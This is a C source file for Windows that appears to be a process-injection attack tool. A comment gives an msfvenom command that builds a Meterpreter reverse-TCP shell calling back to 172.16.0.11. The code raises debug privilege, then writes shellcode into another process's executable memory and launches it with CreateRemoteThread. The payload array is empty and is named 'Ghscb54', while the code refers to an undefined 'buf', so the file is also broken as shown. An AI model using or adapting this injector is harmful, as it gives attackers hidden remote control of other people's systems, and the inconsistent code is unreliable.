#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <stdlib.h>

/*
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.0.11 LPORT=3456 -f c -b \x00\x0a\x0d > shellcode-x64.c
*/


// Buffer payload
unsigned char Ghscb54[] = "";



void SetPrivilege()
{
    LUID luid;
    BOOL res=FALSE;
    HANDLE hCurrentProcess;
    HANDLE hToken;

    hCurrentProcess = GetCurrentProcess();

    OpenProcessToken(hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    res = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    printf("[+] LookupPrivilegeValue: %d\n", res);

    if (res)
    {
        TOKEN_PRIVILEGES tp;

        printf("[+] Debug privilege not found for %#x. Setting\n", luid);

        tp.PrivilegeCount=1;
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes= SE_PRIVILEGE_ENABLED;
        //
        //  Enable the privilege or disable all privileges.
        //
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
        //
        //  Check to see if you have proper access.
        //  You may get "ERROR_NOT_ALL_ASSIGNED".
        //
        printf("[+] Privileges adjusted, %#x\n", GetLastError());
    }

    printf("[+] LookupPrivilegeValue: %d\n", LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid));
}


int main (int argc, char *argv[]) {
    DWORD pid;

    if (argc < 2) {
        printf("Usage: %s <PROCESS PID>\n", argv[0]);
        exit(1);
    }

    pid = strtol(argv[1], NULL, 10);

    SetPrivilege();

    HANDLE hProcess;
    hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, TRUE, pid);

    printf("[+] Process handle: 0x%08x\n", hProcess);

    LPVOID pAddress;
    pAddress = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pAddress) {
        printf("Error in VirtualAlloxEx: %#08x\n", GetLastError());
        exit(1);
    }
    printf("[+] Address: 0x%08x\n", pAddress);

    WriteProcessMemory(hProcess, pAddress, buf, sizeof(buf), NULL);

    DWORD threadId;
    HANDLE hThread;
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pAddress, NULL, 0, &threadId);

    if (!hThread) {
        printf("[-] Error while calling CreateRemoteThread: 0x%08x\n", GetLastError());
        exit(1);
    }

    printf("[+] hThread: 0x%08x\n", hThread);
    printf("[+] Thread Id: %x\n", threadId);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}